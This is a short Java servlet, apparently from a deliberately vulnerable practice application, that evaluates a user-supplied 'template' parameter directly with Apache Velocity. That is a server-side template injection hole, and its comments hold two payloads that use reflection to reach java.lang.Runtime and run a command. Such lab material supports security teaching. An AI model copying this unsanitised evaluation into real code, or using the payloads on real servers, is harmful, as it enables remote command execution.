package com.pika.electricrat.ssti;

import com.pika.electricrat.web.servlet.BaseServlet;
import jakarta.servlet.*;
import jakarta.servlet.http.*;
import jakarta.servlet.annotation.*;
import org.apache.velocity.*;
import org.apache.velocity.app.Velocity;

import java.io.IOException;
import java.io.StringWriter;
import java.lang.reflect.InvocationTargetException;

@WebServlet("/ssti/*")
public class SSTIServlet extends BaseServlet {
    public void showTemple(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // #set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
        // #set+($exp+=+"exp");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("calc");
        String template = request.getParameter("template");
        Velocity.init();
        VelocityContext context = new VelocityContext();
        StringWriter sw = new StringWriter();
        Velocity.evaluate(context, sw, "test", template);
    }

}
